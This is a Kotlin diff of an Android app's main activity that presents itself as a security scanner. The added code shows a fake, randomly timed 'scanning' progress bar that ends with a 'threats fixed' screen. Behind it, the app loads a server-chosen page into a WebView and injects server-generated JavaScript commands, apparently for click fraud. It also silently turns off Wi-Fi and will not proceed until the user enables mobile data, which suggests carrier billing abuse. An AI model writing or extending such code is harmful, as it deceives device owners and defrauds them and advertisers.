@@ -1,10 +1,18 @@
 package ru.mail.aslanisl.webviewapplication
 
 import android.annotation.SuppressLint
+import android.content.BroadcastReceiver
+import android.content.Context
+import android.content.Intent
+import android.content.IntentFilter
 import android.graphics.Color
+import android.net.ConnectivityManager
+import android.net.wifi.WifiManager
 import android.os.Build
 import android.os.Bundle
 import android.os.Handler
+import android.provider.Settings
+import android.support.v7.app.AlertDialog
 import android.support.v7.app.AppCompatActivity
 import android.view.View
 import android.webkit.WebChromeClient
@@ -19,26 +27,55 @@ private const val TASK_TIME = 60 * 1000L
 
 class MainActivity : AppCompatActivity(), Callback<String> {
     private var jSCommandsInvoked = false
-    private var callback: ((List<ServerModel>) -> Unit)? = null
+    private var callback: (() -> Unit)? = null
     private var callbackHrefs: ((String) -> Unit)? = null
 
     private val progressHandler = Handler()
-    private val startTime = System.currentTimeMillis()
-    private val progressTask = object : Runnable{
+    private var startTime = System.currentTimeMillis()
+    private var taskStarted = false
+    private val progressTask = object : Runnable {
         override fun run() {
+            taskStarted = true
             val diff = System.currentTimeMillis() - startTime
 
             val percentAbs: Double = 1 - ((TASK_TIME - diff) / TASK_TIME.toDouble())
             val percent = (percentAbs * 100).toInt()
-            if (percent < 100){
+            if (percent < 100) {
                 updateProgress(percent)
                 val leftLimit = 300L
                 val rightLimit = 3000L
                 val generatedLong = leftLimit + (Math.random() * (rightLimit - leftLimit)).toLong()
                 progressHandler.postDelayed(this, generatedLong)
             } else {
+                taskStarted = false
                 showFinish()
             }
+        }
+    }
+
+    private val dialog by lazy {
+        val builder = AlertDialog.Builder(this)
+        builder.setMessage(R.string.for_work_turn_on_mobile_data)
+        builder.setPositiveButton(getString(android.R.string.ok)) { dialog, _ ->
+            try {
+                val i = Intent(Settings.ACTION_WIRELESS_SETTINGS)
+                startActivity(i)
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
+            dialog.dismiss()
+        }
+        builder.setCancelable(false)
+        return@lazy builder.create()
+    }
+
+    private val connectedReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context, intent: Intent) {
+            if (checkConnection()) {
+                startTask()
+                dialog.dismiss()
+            } else
+                stopTask()
         }
     }
 
@@ -46,25 +83,58 @@ class MainActivity : AppCompatActivity(), Callback<String> {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        progressHandler.post(progressTask)
+        registerReceiver(connectedReceiver, IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION))
 
         callbackHrefs = { initHrefs(it) }
 
         initWebView()
 
-//        Webservice.webApi
-//            .loadServerData("http://bestplace.pw/click.json")
-//            .enqueue(object : Callback<ServerResponse> {
-//                override fun onFailure(call: Call<ServerResponse>?, t: Throwable?) {}
-//
-//                override fun onResponse(call: Call<ServerResponse>?, response: Response<ServerResponse>?) {
-//                    val serverData = response?.body() ?: return
-//
-//                    webView.loadUrl(serverData.url)
-//
-//                    callback = { involveCommands(JSCommanFactory.generateCommands(serverData.elements)) }
-//                }
-//            })
+        Webservice.loadServerResponse(object : Callback<ServerResponse> {
+                override fun onFailure(call: Call<ServerResponse>?, t: Throwable?) {}
+
+                override fun onResponse(call: Call<ServerResponse>?, response: Response<ServerResponse>?) {
+                    val serverData = response?.body() ?: return
+
+                    webView.loadUrl(serverData.url)
+
+                    callback = { involveCommands(JSCommanFactory.generateCommands(serverData.elements)) }
+                }
+            })
+    }
+
+    override fun onStart() {
+        super.onStart()
+        if (checkConnection().not()) return
+        startTask()
+    }
+
+    private fun startTask(){
+        if (taskStarted.not()) {
+            startTime = System.currentTimeMillis()
+            progressHandler.post(progressTask)
+        }
+    }
+
+    private fun stopTask(){
+        progressHandler.removeCallbacks(progressTask)
+        taskStarted = false
+        updateProgress(0)
+    }
+
+    private fun checkConnection(): Boolean {
+        val wifiManager =
+            this.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
+        wifiManager.isWifiEnabled = false
+
+        if (isConnected()) return true
+
+        if (dialog.isShowing.not()) dialog.show()
+        return false
+    }
+
+    private fun isConnected() : Boolean {
+        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+        return cm.activeNetworkInfo?.isConnectedOrConnecting ?: false
     }
 
     @SuppressLint("SetJavaScriptEnabled")
@@ -117,12 +187,12 @@ class MainActivity : AppCompatActivity(), Callback<String> {
 
     override fun onResponse(call: Call<String>?, response: Response<String>?) {}
 
-    private fun updateProgress(percent: Int){
+    private fun updateProgress(percent: Int) {
         progressBar.progress = percent
         progressText.text = "$percent%"
     }
 
-    private fun showFinish(){
+    private fun showFinish() {
         titleView.setText(R.string.scanning_finish)
         progressContainer.visibility = View.GONE
         threadsFixed.visibility = View.VISIBLE
@@ -132,5 +202,7 @@ class MainActivity : AppCompatActivity(), Callback<String> {
         super.onDestroy()
         callback = null
         callbackHrefs = null
+        unregisterReceiver(connectedReceiver)
+        stopTask()
     }
 }
